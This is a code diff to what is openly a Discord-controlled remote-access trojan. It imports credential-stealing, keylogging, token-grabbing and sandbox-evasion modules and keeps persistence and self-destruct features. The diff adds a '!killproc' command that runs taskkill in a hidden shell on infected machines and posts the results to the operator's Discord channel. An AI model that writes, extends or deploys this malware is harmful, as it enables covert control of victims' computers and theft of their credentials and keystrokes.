@@ -28,7 +28,7 @@ from winreg import *
 from ctypes import *
 from libraries import credentials,keylogger,tokengrabber,sandboxevasion
 
-VERSION = "v1.1.6"
+VERSION = "v1.1.7"
 
 KEYLOG = {KEYLOG}
 PERSISTENT = {PERSISTENT}
@@ -428,6 +428,20 @@ async def selfdestruct(context):
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while removing Agent#{ID} persistence:\n{e}", color=0xFF0000)
             await context.message.channel.send(embed=my_embed)
+
+@client.command(name='killproc',pass_context=True)
+async def process(context):
+    command = context.message.content.replace("!killproc ", "")
+    process = command.split()
+    result = sp.Popen(f"taskkill /F /PID {process[1]}", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
+    out, err = result.communicate()
+    result.wait()
+    if err:
+        my_embed = discord.Embed(title=f"Error while killing process on Agent#{ID}:\n{err}", color=0xFF0000)
+        await context.message.channel.send(embed=my_embed)
+    else:
+        my_embed = discord.Embed(title=f"Successfully killed process {process[1]} on Agent#{ID}", color=0x00FF00)
+        await context.message.channel.send(embed=my_embed)
 
 @client.event
 async def on_ready():
